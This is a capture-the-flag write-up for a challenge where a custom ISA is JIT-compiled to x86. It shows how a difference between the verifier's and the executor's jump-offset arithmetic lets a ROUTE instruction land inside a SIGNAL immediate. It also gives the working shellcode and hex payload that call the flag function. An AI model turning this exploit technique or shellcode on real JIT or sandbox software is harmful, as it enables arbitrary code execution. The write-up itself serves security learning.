**Flag:** `BDSEC{mukt1r_5h0ngk3t_r34ch3d_th3_f13ld}`

**TL;DR** Verifier vs JIT-executor parser differential. Custom ISA is JIT-translated to x86 in an RWX page and `call`ed. ROUTE emits `JMP rel32=disp8` in *translated* space, but the verifier only bounds-checks the ROUTE target in *source* space. Jump into a SIGNAL's 8-byte immediate (shellcode) to run `call flag_fn`.

**Find** Menu: upload hex → verify → execute. ISA (opcode = 1st byte):
- 0x10 WAIT (1B) → NOP
- 0x20 SIGNAL (9B: op+u64) → `eb 08` + 8 raw imm bytes (data, jumped over)
- 0x30 ROUTE (2B: op+disp8) → `e9 rel32` (rel32 = sign-extended disp8)
- 0x40 END (1B) → RET ; 0xf0 FREEDOM rejected by verifier
Verifier ROUTE check: `src_off+2+disp8 < len`. Executor JMP lands at `dest_off+5+disp8`. Sizes differ (SIGNAL 9→10, ROUTE 2→5) so a ROUTE can land inside a SIGNAL's data (executor) while the verifier sees a benign in-bounds source offset. Non-PIE; flag fn at 0x401bb0 (open/read/print flag.txt).

**Solve** shellcode (8B, fits one SIGNAL imm): `b8 b0 1b 40 00`(mov eax,0x401bb0) `ff d0`(call rax) `c3`(ret).
Transmission = ROUTE `30 02` | SIGNAL `20`+shellcode | END `40`  →  hex `300220b8b01b4000ffd0c340`.
Translated: `e9 02 00 00 00`(dest0, jmp→dest7) `eb 08`(dest5) shellcode(dest7-14) `c3`(dest15).
Upload → Verify (approved: target 4<12) → Execute → JMP dest7 → shellcode calls flag fn → flag.
See solver.py.
